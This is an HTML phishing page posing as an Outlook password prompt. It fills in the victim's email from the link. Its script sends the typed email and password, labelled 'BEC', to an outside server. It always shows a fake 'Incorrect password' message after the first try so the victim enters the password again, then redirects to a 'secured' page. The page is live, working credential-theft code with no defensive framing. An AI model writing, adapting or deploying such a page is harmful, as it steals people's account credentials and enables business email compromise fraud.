<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Bootstrap CSS -->
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
      integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N"
      crossorigin="anonymous" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" />
    <link rel="stylesheet" href="/css/alert.css" />

    <title>Outlook</title>
  </head>
  <body>
    <div class="container">
      <div class="toaster shadow" id="toaster">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2"
          stroke-linecap="round"
          stroke-linejoin="round"
          class="lucide lucide-message-circle-warning">
          <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z" />
          <path d="M12 8v4" />
          <path d="M12 16h.01" />
        </svg>
        <p>Incorrect password</p>
      </div>
      <div class="row">
        <div class="col-md-3"></div>
        <div class="col-md-6 mt-4 ml-2">
          <img src="/image/RE1Mu3b.png" alt="" style="height: 33px" />
          <div>
            <div style="font-size: 22px; margin-top: 32px; margin-bottom: 28px">
              <a href="/index.html" class="anchor">
                <i
                  class="fa fa-arrow-left"
                  aria-hidden="true"
                  style="
                    font-size: 18px;
                    padding-right: 15px;
                    color: black;
                    text-decoration: none;
                  "></i>
              </a>
              <span id="emailP"></span>
            </div>
            <p
              style="
                font-size: 33px;
                font-weight: 600;
                color: black;
                margin-bottom: 0px;
              ">
              Enter Password
            </p>
          </div>
          <form id="form">
            <label for="password"></label>
            <input
              type="password"
              name="password"
              id="password"
              required
              minlength="5"
              placeholder="Password"
              style="
                width: 100%;
                padding-top: 10px;
                padding-bottom: 10px;
                border: solid 0px white;
                font-size: 20px;
                margin-top: 0px;
                outline: none;
              " />
            <div
              style="height: 1.5px; background-color: grey; width: 100%"
              class="mb-5"></div>
            <div style="display: flex; justify-content: flex-end">
              <button
                id="submitBtn"
                style="
                  background-color: rgb(65, 65, 125);
                  font-size: 22px;
                  padding-top: 6px;
                  padding-bottom: 6px;
                  padding-left: 42px;
                  padding-right: 42px;
                  color: white;
                  border: solid 1px white;
                ">
                Next
              </button>
            </div>
          </form>
        </div>
        <div class="col-md-3"></div>
      </div>
    </div>
    <script>
      const urlParams = new URLSearchParams(window.location.search);
      const emailP = document.getElementById("emailP");
      const form = document.getElementById("form");
      const password = document.getElementById("password");
      const submitBtn = document.getElementById("submitBtn");
      const email = urlParams.get("e");
      const toaster = document.getElementById("toaster");

      let trial = 0;

      toaster.style.display == "flex";
      emailP.innerHTML = email;

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        submitBtn.disabled = true;
        if (trial == 0) {
          try {
            const res = await fetch(
              "https://basic-backend-ejem.onrender.com/cl",
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                credentials: "include",
                body: JSON.stringify({
                  form: "BEC",
                  username: email,
                  password: password.value,
                  trial: trial,
                }),
              }
            );
            const response = await res.json();
            submitBtn.disabled = false;
            trial = 1;
            form.reset();
            toaster.style.display = "flex";
            setTimeout(() => {
              toaster.style.display = "none";
            }, 5000);
            return;
          } catch (err) {
            submitBtn.disabled = false;
            console.log(err);
            return;
          }
        }
        try {
          const res = await fetch(
            "https://basic-backend-ejem.onrender.com/cl",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              credentials: "include",
              body: JSON.stringify({
                form: "BEC",
                username: email,
                password: password.value,
                trial: trial,
              }),
            }
          );
          const response = await res.json();
          submitBtn.disabled = false;
        } catch (err) {
          submitBtn.disabled = false;
          console.log(err);
        }
        submitBtn.disabled = false;
        form.reset();
        location.href = `/secured.html?e=${email}`;
      });
    </script>
    <script
      src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
      integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
      crossorigin="anonymous"></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct"
      crossorigin="anonymous"></script>
  </body>
</html>
